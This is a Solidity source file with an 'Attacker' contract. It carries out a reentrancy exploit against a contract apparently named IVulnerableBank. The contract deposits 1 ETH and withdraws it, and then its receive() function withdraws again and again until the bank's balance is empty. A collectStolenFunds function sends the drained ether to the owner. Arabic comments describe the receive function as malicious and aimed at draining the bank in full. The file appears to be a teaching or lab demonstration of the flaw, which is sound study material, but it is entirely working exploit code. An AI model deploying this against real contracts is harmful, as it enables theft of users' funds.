// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IVulnerableBank {
    function deposit() external payable;
    function withdraw(uint256 _amount) external;
}

contract Attacker {
    IVulnerableBank public vulnerableBank;
    address public owner;

    constructor(address _vulnerableBankAddress) {
        vulnerableBank = IVulnerableBank(_vulnerableBankAddress);
        owner = msg.sender;
    }

    function attack() external payable {
        require(msg.value >= 1 ether, "Need 1 ETH");
        vulnerableBank.deposit{value: 1 ether}();
        // نسحب 1 إيثيريوم لنبدأ حلقة الاستنزاف المتداخلة
        vulnerableBank.withdraw(1 ether);
    }

    // دالة الاستقبال الخبيثة التي تستنزف رصيد البنك بالكامل عبر إعادة الدخول
    receive() external payable {
        uint256 bankBalance = address(vulnerableBank).balance;
        if (bankBalance >= 1 ether) {
            vulnerableBank.withdraw(1 ether);
        } else if (bankBalance > 0) {
            vulnerableBank.withdraw(bankBalance);
        }
    }

    function collectStolenFunds() external {
        require(msg.sender == owner, "Not owner");
        (bool success, ) = owner.call{value: address(this).balance}("");
        require(success, "Transfer failed");
    }
}
